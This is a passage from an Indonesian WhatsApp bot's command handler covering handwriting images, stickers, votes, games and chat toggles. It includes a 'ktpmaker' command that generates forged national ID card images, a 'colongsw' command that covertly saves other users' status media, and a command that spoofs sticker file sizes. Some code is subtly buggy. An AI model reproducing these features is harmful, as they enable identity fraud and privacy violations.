									'+140+153',
									fixHeight,
									'./media/nulis/images/buku/setelahkiri.jpg'
									])
									.on('error', () => reply(lang.tryAgain()))
									.on('exit', () => {
										alpha.sendMessage(from, fs.readFileSync('./media/nulis/images/buku/setelahkiri.jpg'), image, {thumbnail:Buffer.alloc(0),quoted: mek, caption: `Jangan Malas`})
										limitAdd(sender, limit)
										})
									}
									break
						case 'nuliskanan':{
									if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}nuliskanan* teks`)
									reply(mess.wait)
									const tulisan = q
									const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
									const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
									spawn('convert', [
									'./media/nulis/images/buku/sebelumkanan.jpg',
									'-font',
									'./media/nulis/font/Indie-Flower.ttf',
									'-size',
									'960x1280',
									'-pointsize',
									'23',
									'-interline-spacing',
									'2',
									'-annotate',
									'+128+129',
									fixHeight,
									'./media/nulis/images/buku/setelahkanan.jpg'
									])
									.on('error', () => reply(lang.tryAgain()))
									.on('exit', () => {
										alpha.sendMessage(from, fs.readFileSync('./media/nulis/images/buku/setelahkanan.jpg'), image, {thumbnail:Buffer.alloc(0),quoted: mek, caption: `Jangan Malas`})
										limitAdd(sender, limit)
										})
									}
									break
						case 'foliokiri':{
									if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}foliokiri* teks`)
									reply(mess.wait)
									const tulisan = q
									const splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
									const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
									spawn('convert', [
									'./media/nulis/images/folio/sebelumkiri.jpg',
									'-font',
									'./media/nulis/font/Indie-Flower.ttf',
									'-size',
									'1720x1280',
									'-pointsize',
									'23',
									'-interline-spacing',
									'4',
									'-annotate',
									'+48+185',
									fixHeight,
									'./media/nulis/images/folio/setelahkiri.jpg'
									])
									.on('error', () => reply(lang.tryAgain()))
									.on('exit', () => {
										alpha.sendMessage(from, fs.readFileSync('./media/nulis/images/folio/setelahkiri.jpg'), image, {thumbnail:Buffer.alloc(0),quoted: mek, caption: `Jangan Malas`})
										limitAdd(sender, limit)
										})
									}
									break
						case 'foliokanan':{
									if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}foliokanan* teks`)
									reply(mess.wait)
									const tulisan = q
									const splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
									const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
									spawn('convert', [
									'./media/nulis/images/folio/sebelumkanan.jpg',
									'-font',
									'./media/nulis/font/Indie-Flower.ttf',
									'-size',
									'960x1280',
									'-pointsize',
									'23',
									'-interline-spacing',
									'3',
									'-annotate',
									'+89+190',
									fixHeight,
									'./media/nulis/images/folio/setelahkanan.jpg'
									])
									.on('error', () => reply(mess.error))
									.on('exit', () => {
										alpha.sendMessage(from, fs.readFileSync('./media/nulis/images/folio/setelahkanan.jpg'), image, {thumbnail:Buffer.alloc(0),quoted: mek, caption: `Jangan Malas`})
										limitAdd(sender, limit)
									})
									}
									break      
       case 'ttp':  
                    if (args.length < 1) return reply(lang.noteks(prefix, command))
                    ttp = args.join(' ')
                    anu1 = await getBuffer(`https://api.xteam.xyz/ttp?file&text=${ttp}`)
                    alpha.sendMessage(from, anu1, image, {quoted: ftroli, caption : '.sticker'})
                    break
         case 'attp':  
                    if (args.length < 1) return reply(lang.noteks(prefix, command))
                    hhhh = q
                    anu1 = await getBuffer(`https://api.xteam.xyz/attp?file&text=${hhhh}`)
                    alpha.sendMessage(from, anu1, sticker, {quoted: mek})
                    break
             case 'ktpmaker': case 'ktp':
                    if (args.length == 0) return reply(`Usage: ${prefix + command} nik|provinsi|kabupaten|nama|tempat, tanggal lahir|jenis kelamin|jalan|rt/rw|kelurahan|kecamatan|agama|status nikah|pekerjaan|warga negara|berlaku sampai|url_image\n\nExample: ${prefix + command} 456127893132123|bumipertiwi|fatamorgana|LoL Human|mars, 99-99-9999|belum ditemukan|jl wardoyo|999/999|turese|imtuni|alhamdulillah islam|jomblo kack|mikirin dia|indo ori no kw|hari kiamat|https://i.ibb.co/Xb2pZ88/test.jpg`)
                    get_args = args.join(" ").split("|")
                    nik = get_args[0]
                    prov = get_args[1]
                    kabu = get_args[2]
                    name = get_args[3]
                    ttl = get_args[4]
                    jk = get_args[5]
                    jl = get_args[6]
                    rtrw = get_args[7]
                    lurah = get_args[8]
                    camat = get_args[9]
                    agama = get_args[10]
                    nikah = get_args[11]
                    kerja = get_args[12]
                    warga = get_args[13]
                    until = get_args[14]
                    img = get_args[15]
                    reply('waitt')
                    bikin = (`https://ferdiz-afk.my.id//api/maker/ktp?nik=${nik}&nama=${name}&ttl=${ttl}&jk=${jk}&gdarah=-&almt=${jl}&rt-rw=${rtrw}&kel=${lurah}&kcmtn=${camat}&agma=${agama}&status=${nikah}&kerja=${kerja}&negara=${warga}&berlaku=${until}&prov=${prov}&kab=${kabu}&picurl=${img}`)
                      console.log(bikin)
                    imge = await getBuffer(bikin)
                    await alpha.sendMessage(from, imge, image, { thumbnail: Buffer.alloc(0), quoted: mek });
                    break;
        case 'nulis2':
if (args.length < 1) return reply(`*Usage*: ${prefix + command} nama&kelas&nomor&kata\n*Example*: ${prefix + command} udin&20&17&blablabla`)
var bodi = args.join(" ")
var nama = bodi.split("&")[0];
var kelas = bodi.split("&")[1];
var no = bodi.split("&")[2];
var aksarane = bodi.split("&")[3];
reply('membuat bos...')
                 rakz = await getBuffer(`https://ferdiz-afk.my.id//api/tulis?nama=${nama}&no=${no}&kelas=${kelas}&text=${aksarane}`)
                 alpha.sendMessage(from, rakz, image, { quoted: mek ,thumbnail: Buffer.alloc(0) });

                 break;
              /*
              ]----------------------------------------------------------------> STORAGE <----------------------------------------------------------------[
              */
	        case 'addstik':
	if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if (!isQuotedSticker) return fakestatus('Reply stiker')
					nm = body.slice(9)
					if (!nm) return reply('Nama sticker nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await alpha.downloadMediaMessage(boij)
					setiker.push(`${nm}`)
					fs.writeFileSync(`./media/sticker/${nm}.webp`, delb)
					fs.writeFileSync('./temp/stik.json', JSON.stringify(setiker))
					fakegroup(`Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`)
					break
	      case 'liststik':
	      case 'liststiker':
	      case 'liststc':
					teks = '*Sticker list :*\n\n'
					for (let awokwkwk of setiker) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${setiker.length}*\n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama sticker_`
					alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setiker } })
					break
					
			case 'addimg':
			if(!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if (!isQuotedImage) return fakegroup('```Reply imagenya```')
					clara = body.slice(8)
					if (!clara) return fakegroup('```Nama imagenya apa```')
					keya = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await alpha.downloadMediaMessage(keya)
					imagenye.push(`${svst}`)
					fs.writeFileSync(`./media/foto/${svst}.jpg`, delb)
					fs.writeFileSync('./temp/image.json', JSON.stringify(imagenye))
					fakegroup(`Sukses Menambahkan image\nCek dengan cara ${prefix}listimg`)
					break
			case 'listimg':
					teks = '*Image list :*\n\n'
					for (let awokwkwk of imagenye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${imagenye.length}*\n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama foto/image_`
					fakegroup(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setiker } })
					break
			case 'addvid':
			if(!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if (!isQuotedVideo) return fakegroup('```Reply vidionya```')
					svst = body.slice(8)
					if (!svst) return fakegroup('```Nama vidionya apa```')
					keya = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await alpha.downloadMediaMessage(keya)
					imagenye.push(`${svst}`)
					fs.writeFileSync(`./media/video/${svst}.mp4`, delb)
					fs.writeFileSync('./temp/video.json', JSON.stringify(imagenye))
					fakegroup(`Sukses Menambahkan video\nCek dengan cara ${prefix}listvideo`)
					break
	        case 'listvid':
					teks = '*List Video :*\n\n'
					for (let awokwkwk of videonye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${videonye.length}* \n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama video_`
					alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": imagenye } })
					break
			
			case 'addvn':
			if(!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if (!isQuotedAudio) return fakegroup('```Reply vnnya```')
					svst = body.slice(7)
					if (!svst) return reply('```Nama audionya apa```')
					keya = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await alpha.downloadMediaMessage(keya)
					audionye.push(`${svst}`)
					fs.writeFileSync(`./media/audio/${svst}.mp3`, delb)
					fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
					fakegroup( `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
					break
           
			case 'listvn':
					teks = '*List Vn:*\n\n'
					for (let awokwkwk of audionye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${audionye.length}*\n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama audio_`
					alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": audionye } })
					break
			case 'addrespon':
			if(!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if(!q) return reply(`ketik perintah ${prefix + command} filter|jawab!`)
					fltr = q.split('|')[0]
					jwb = q.split('|')[1]
					if(!jwb) return reply('Format salah!')
					for(let i of filter){
					  if(fltr.includes(i.Filter)) return reply(`Filter ${fltr} sudah ada didatabase`)
					}
					const chat = {
					Filter : fltr,
					Jawaban : jwb
					}
					filter.push(chat)
					fs.writeFileSync('./src/filter.json', JSON.stringify(filter))
					reply(`Sukses menambahkan filter ${fltr}\nCek dengan cara ${prefix}listchatrespon`)
					break
					
			case 'delrespon':
			if(!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					for(let i=0; i<filter.length; i++){
					if(q.includes(filter[i].Filter)){
					   obj = {
					      txt: filter[i].text,
					      balesan: filter[i].balesan
					   }
					   let del = filter.indexOf(filter[i])
					   filter.splice(del, 1)
					   fs.writeFileSync('./src/filter.json', JSON.stringify(filter))
					   reply(`Sukses Menghapus Respon ${q}`)
					}
					}
					break
case 'listrespon':
   teks = 'List Respon:\n'
   for (let i of filter) {
   teks += `• Filter : ${i.Filter}\n• Jawab : ${i.Jawaban}\n---------------------------\n`
   }
   teks += `Total : ${filter.length}`
   alpha.sendMessage(from, teks.trim(), extendedText, {quoted: mek})
   break
		case 'caripesan2':
            if(!q)return reply('Masukkan pesan yg mau di cari')
            let v = await alpha.searchMessages(q,from,10,1)
            let s = v.messages
            let el = s.filter(v => v.message)
            el.shift()
            try {
            if(el[0].message.conversation == undefined) return
            reply(`Ditemukan ${el.length} pesan`)
            await sleep(3000)
            for(let i = 0; i < el.length; i++) {
            await alpha.sendMessage(from,'Nih pesannya',text,{quoted:el[i]})
            }
            } catch(e){
            reply('Pesan tidak ditemukan!')
            }           
            break
     case 'searchmsg':  
             if (args.length < 1) return reply(`Pesan Yang Mau Dicari Apaan?\nContoh : ${command} halo|10`)
             teks = arg
             if (teks.includes("|")) { 
             try {
             var ve = teks.split("|")[0]
             var za = teks.split("|")[1]
             sampai = `${za}`
             if (isNaN(sampai)) return reply('Harus berupa Angka!')
             batas = parseInt(sampai) + 1
             if (batas > 20) return reply('Maks 20!')
             reply(lang.wait())
             cok = await nino.searchMessages(`${ve}`, from, batas,1) 
             if (cok.messages.length < 2) return reply('Tidak Ditemukan Pesan') 
             if (cok.messages.length < parseInt(batas)) reply(`Hanya Ditemukan ${cok.messages.length - 1} Pesan`)
             for (i=1;i < cok.messages.length;i++) {
             if (cok.messages[i].message) {
             alpha.sendMessage(from, `Ditemukan!`, text, {sendEphemeral: true, quoted: cok.messages[i]}) 
			}
			}
             } catch (e) {
             return reply(String(e))}
             } else {
             reply(`Format salah, format yang benar : ${command} halo|10`)}
             break
    case 'hash':
                try {
                if (!isQuotedSticker) return reply('Reply Sticker!')
                const encmeds = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                const mediastick = await alpha.downloadMediaMessage(encmeds)
                var crypto = require('crypto')
                hash = crypto.createHash('sha256').update(mediastick).digest('base64');
                console.log(hash)
                reply (hash)
                } catch {
                	reply(`reply stiker dengan command ${prefix}hash`)
	}
            break
    case 'delvote':
            if(!isGroupAdmins && !mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlygcAdmin())
            if(isVote) return reply(lang.noSesiVote())
            delVote(from)
            reply(lang.suksesDelVot())
            break
    case 'voting':
            if(!isGroupAdmins && !mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlygcAdmin())
            if(!isGroup) return reply(lang.onlygc())
            if (isVote) return reply(lang.adaVoting())
            if(!q) return reply(lang.caraVoting())
            if (mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 || mek.message.extendedTextMessage.contextInfo == null) {
            let id = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            split = args.join(' ').replace('@', '').split('|')
            if(!Number(split[2])) return reply(lang.caraVot(prefix, command))
            await mentions('Vote ' +'@'+ id.split('@')[0]+' Di Mulai' +'\n\n' + `vote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,[id],true)
            addVote(from,split[1],split[0],split[2],reply)
            }
            break
		case 'jadibot':
			    if(!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.callOwner())
			    jadibot(reply,alpha,from)
			    break
		case 'stopjadibot':
			    if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			    stopjadibot(reply)
			    break
		case 'listbot':
			    let tekss = '「 *LIST JADIBOT* 」\n'
			    for(let i of listjadibot) {
			    tekss += `*Number* : ${i.jid.split('@')[0]}
*Name* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n`
			    }
			    reply(tekss)
		case 'addcmd': 
       case 'setcmd':
              if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
              if (isQuotedSticker) {
              if (!q) return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
              var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
              addCmd(kodenya, q)
              reply(lang.success())
              } else {
              reply('Reply stickenya')
}
              break
       case 'delcmd':
              if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
              if (!isQuotedSticker) return reply(`Penggunaan : ${command} tagsticker`)
              var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
            scommand.splice(getCommandPosition(kodenya), 1)
              fs.writeFileSync('./lib/scommand.json', JSON.stringify(scommand))
              reply(lang.success())
              break
       case 'listcmd':
              let teksnyee = `「 *LIST STICKER CMD* 」`
              let cemde = [];
              for (let i of scommand) {
              cemde.push(i.id)
              teksnyee += `\n\n📍 *ID :* ${i.id}\n📍 *Cmd* : ${i.chats}`
}
              mentions(teksnyee, cemde, true)
              break
      case 'delttt':
case 'delttc':
               if (!isGroup) return reply(lang.onlygc())
              // if (!isTTT) return reply('Tidak Ada Permainan Di Grub Ini')
               delete tictactoe[senderNumber]
fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))                        
if (fs.existsSync('./temp/' + from + '.json')) {
fs.unlinkSync('./temp/' + from + '.json')
reply(lang.suksesDelTtt())
}
               break
        case 'cekhistory':
reply(` S T A T U S  T I C T A C T O E ${enter}•> Win : ${checkWin(sender)}${enter}•> Lose : ${checkLose(sender)}`)
break
case 'delsesi':
if (!isGroupAdmins && !mek.key.fromMe && !isOwner) return reply('Hanya bisa didelete oleh admin group dan owner bot')
if (args[0] === 'ttt') {
delete tictactoe[senderNumber]
fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))                        
if (fs.existsSync('./temp/' + from + '.json')) {
fs.unlinkSync('./temp/' + from + '.json')
reply(lang.noSesiTtt())
}
} else if (args[0] === 'vote') {
if(isVote) return reply(lang.noSesiVote())
            delVote(from)
            reply(lang.sukseDelVot())
} else {
	reply(`${prefix + command}delsesi ttt atau vote`)
}
break

case 'tictactoe':
case 'ttt':
if (!isGroup)return reply('*buat gc doang*')
if (mek.message.extendedTextMessage.contextInfo.mentionedJid > 1) return reply('Hanya bisa dengan 1 orang')
if (!mek.message.extendedTextMessage.contextInfo.mentionedJid[0]) return
if (fs.existsSync(`./temp/${from}.json`)) return reply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan${enter}Ketik *${prefix}delsesi ttt*, untuk menghapus sesi`)
if (args.length === 0) return reply(`Tag Lawan Yang Ingin Diajak Bermain Game`)
tttSkuy = setTtt(`${from}`)
tttSkuy.status = false
tttSkuy.Z = sender.replace("@s.whatsapp.net", "")
tttSkuy.Y = args[0].replace("@", "");
fs.writeFileSync(`./temp/${from}.json`, JSON.stringify(tttSkuy, null, 2))
starGame = `「 *MEMULAI GAME TICTACTOE* 」${enter}${enter}•@${sender.replace("@s.whatsapp.net", "")} Menantang Bermain Tictactoe ${enter}[ ${args[0]} ] Ketik Y/N untuk menerima atau menolak permainan${enter}${enter}`
alpha.sendMessage(from, starGame, text, {quoted: mek, contextInfo: { mentionedJid: [sender, args[0].replace("@", "") + "@s.whatsapp.net"],}})
break
             case 'size':
if (args.length < 1) return reply('Masukan angkanya')
filsize = args[0]
costick = await alpha.prepareMessageFromContent(from,{
"stickerMessage": {
"url": m.quoted.url,
"fileSha256": m.quoted.fileSha256.toString('base64'),
"fileEncSha256": m.quoted.fileEncSha256.toString('base64'),
"mediaKey": m.quoted.mediaKey.toString('base64'),
"mimetype": m.quoted.mimetype,
"height": m.quoted.height,
"width": m.quoted.width,
"directPath": m.quoted.directPath,
"fileLength": filsize,
"mediaKeyTimestamp": m.quoted.mediaKeyTimestamp.low,
"isAnimated": m.quoted.isAnimated
}
}, {quoted:mek})
alpha.relayWAMessage(costick)
break
case "colongsw": 
        if (!mek.key.fromMe) return
        if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
          ger = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await alpha.downloadAndSaveMediaMessage(ger);
          alpha.sendMessage(sender, fs.readFileSync(owgi), "imageMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else if ((isMedia && !mek.message.videoMessage) || isQuotedVideo) {
          ger = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await alpha.downloadAndSaveMediaMessage(ger);
          alpha.sendMessage(sender, fs.readFileSync(owgi), "videoMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else {
          reply("Reply sw foto / video yg mau dicolong")
        }
        break
       case "listonline": 
        let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat;
        try {
          let online = [
            ...Object.keys(alpha.chats.get(id).presences),
            alpha.user.jid,
          ];
          alpha.reply(
            m.chat,
            "「 L I S T   O N L I N E  」\n" +
              online.map((v) => "├ @" + v.replace(/@.+/, "")).join`\n` +
              "\n",
            m,
            {
              contextInfo: { mentionedJid: online },
            }
          );
        } catch (e) {
          m.reply("");
        }
        break;
        case 'getname':
 try {
getnem = alpha.getName(mek.quoted.sender)
reply(`${getnem}`)
} catch {
	reply ('Reply pesan @user')
	}
break
case 'linkgrup':
case 'linkgroup':
				case 'linkgc':
				    if (!isGroup) return reply(lang.onlygc())
				    if (!isBotGroupAdmins) return reply(mess.only.Badmin)
				    linkgc = await alpha.groupInviteCode (from)
				    yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
				    alpha.sendMessage(from, yeh, text, {quoted: mek})
			        break
		case 'unpin':
                if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                alpha.modifyChat(from, ChatModification.unpin)
                reply('*succes unpin this chat*')
                console.log('unpin chat = ' + from)
                break
        case 'pin':
                if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                alpha.modifyChat(from, ChatModification.pin)
                reply('*succes pin this chat*')
                console.log('pinned chat = ' + from)
                break
         case 'unreadall':
                if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                var chats = await alpha.chats.all()
                chats.map( async ({ jid }) => {
                await alpha.chatRead(jid, 'unread')
                    })
		    reply(`\`\`\`Successfully unread ${chats.length} chats !\`\`\``)
		    console.log(chats.length)
	        break
	        
            case 'readall':
                if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                var chats = await alpha.chats.all()
                chats.map( async ({ jid }) => {
                await alpha.chatRead(jid)
                })
		reply(`\`\`\`Successfully read ${chats.length} chats !\`\`\``)
	      console.log(chats.length)
		break
		case 'unarchiveall':
                if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                reply('*succes unarchive all chat*')
                console.log('succes unarchive chat = ' + from)
                anu = await alpha.chats.all()
                for (let _ of anu) {
                alpha.modifyChat(_.jid, ChatModification.unarchive)
                }
                break
                
            case 'archive':
                if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                reply(lang.wait())
                console.log('succes archive chat = ' + from)
                await sleep(3000)
                alpha.modifyChat(from, ChatModification.archive)
                break
           case 'delthischat':
                if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                console.log('succes delete chat = ' + from)
                await sleep(4000)
                await alpha.modifyChat(from, ChatModification.delete)
                reply('*succes delete this chat*')
                break
            case 'ssweb':
            case 'ss':
                if (args.length < 1) return reply('Urlnya mana om')
					teks = q
					anu = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${teks}`)
					buff = await getBuffer(anu.screenshot)
					alpha.sendMessage(from, buff, image, {quoted: mek, caption : teks})
					break
			case 'artinama':
                if (args.length < 1) return reply('Apa yang mau dicari um?')
                teks = q
					anu = await fetchJson(`https://mnazria.herokuapp.com/api/arti?nama=${teks}`, {method: 'get'})
					reply(`Arti Nama ${teks}\n\n`+anu.result)
				break
			case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
ter = command[1].toLowerCase()
  tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
 reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
 break
 case 'getexif':
try {
    if (!m.quoted) return reply('Tag stikernya!')
    cok = { message: { [m.quoted.mtype]: m.quoted } }
    if (/sticker/.test(m.quoted.mtype)) {
        let img = new webp.Image()
        await img.loadBuffer(await m.quoted.download())
        reply(util.format(JSON.parse(img.exif.slice(22).toString())))
    }
    } catch (e) {
    	throw e
    reply(String(e))
    }
    break
		case 'afk':
			if (!isGroup) return reply(lang.onlygc())
            if (isAfkOn) return 
                reason = q ? q : 'Nothing'
                off.addAfkUser(sender, Date.now(), reason, _off)
               papa =  `\n*@${sender.split('@')[0]}* is now AFK\n*Reason :* ${reason}\n`
                alpha.sendMessage(from,papa, text,{quoted : ftroli,contextInfo: {mentionedJid: [sender]}})
            break
        case 'autoread':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args.length < 1) return reply(`Example:\n${prefix}autoread gc on`)
if (args[0] === "gc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread gc on`)
if (args[1] === "on") {
if (readGc === true) return reply(lang.anjawaUdhOn(command))
readGc = false
reply(`Succes matiin autoread group`)
} else if (args[1] === "off") {
if (readGc === true) return
readGc = true
reply(`Succes menghidupkan autoread group`)
} else {
reply(`Pilih on atau off`)
}
} else if (args[0] === "pc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread pc on`)
if (args[1] === "on") {
if (readPc === true) return reply(lang.anjawaUdhOn(command))
readPc = true
reply(`Succes mengaktifkan autoread pc`)
} else if (args[1] === "off") {
if (readPc === false) return
readPc = false
reply(`Succes mematikan autoread pc`)
} else {
reply(`Pilih on atau off`)
}
} else {
reply(`*List Auto Read*\n•> gc\n•> pc`)
}
break
case 'nsfw':
					    if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
						if (!isGroup) return reply(lang.onlygc()) 
						if (args.length < 1) return reply(lang.anjawaUdhOon(command))
						if (args[0] === 'on') {
						if (isNsfw) return reply(lang.anjawaUdhOn(command))
						_nsfw.push(from)
						fs.writeFileSync('./src/nsfw.json', JSON.stringify(_nsfw))
						reply(lang.anjawaOn(command))
						} else if (args[0] === 'off') {
						_nsfw.splice(from, 1)
						fs.writeFileSync('./src/nsfw.json', JSON.stringify(_nsfw))
						reply(lang.anjawaOff(command))
						} else if (!q) {
          sendButMessage(from, `MODE NSFW`, `Choose one`, [
            {
              buttonId: 'nsfw on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'nsfw off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
case 'antibug':
          if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
          if (args[0] === 'on') {
          if (bugc === true) return reply(lang.anjawaUdhOn(command))
          bugc = true
          antitrol = true
          reply(lang.anjawaOn(command))
          } else if (args[0] === 'off') {
          if (bugc === false) return
          bugc = false
          antitrol = false
          reply(lang.anjawaOff(command))
          } else if (!q) {
          sendButMessage(from, `MODE ANTIBUG`, `Choose one`, [
            {
              buttonId: 'antibug on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'antibug off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
          case 'antidelete':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args[0] === "on") {
if (antidel === true) return reply(lang.anjawaUdhOn(command))
antidel = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (antidel === false) return
antidel = false
reply(lang.anjawaOff(command))
} else if (!q) {
          sendButMessage(from, `MODE ANTI DELETE`, `Choose one`, [
            {
              buttonId: 'antidelete on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'antidelete off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
case 'anticall':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if (antical === true) return reply(lang.anjawaUdhOn(command))
antical = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (antical === false) return
antical = false
reply(lang.anjawaOff(command))
} else {
reply(lang.onORoff(command))
}
break
case 'autoketik':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args[0] === "on") {
if (autoketik === true) return reply(lang.anjawaUdhOn(command))
autoketik = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (autoketik === false) return
autoketik = false
reply(lang.anjawaOff(command))
} else if (!q) {
          sendButMessage(from, `MODE AUTO KETIK`, `Choose one`, [
            {
              buttonId: 'autoketik on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'autoketik off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
        case 'autorespon': case 'autorespond':
      if (!isOwner && !isCreator && !mek.key.fromMe) return reply(lang.onlyOwner())
       if (q === 'on'){
           	if (autorespon === false) return reply(lang.anjawaUdhOn(command))
              autorespon = false
                    reply(lang.anjawaOn(command))
                } else if (q === 'off'){
                	if (autorespon === true) return
                    autorespon = true
                    reply(lang.anjawaOff(command))
                } else if (!q) {
          sendButMessage(from, `MODE AUTO RESPON`, `Choose one`, [
            {
              buttonId: 'autorespon on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'autorespon off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
case 'autobio':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args[0] === "on") {
if (autobio === true) return reply(lang.anjawaUdhOn(command))
autobio = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (autobio === false) return
autobio = false
reply(lang.anjawaOff(command))
} else if (!q) {
          sendButMessage(from, `MODE AUTO BIO`, `Choose one`, [
            {
              buttonId: 'autobio on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'autobio off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
        case 'antihidetag':
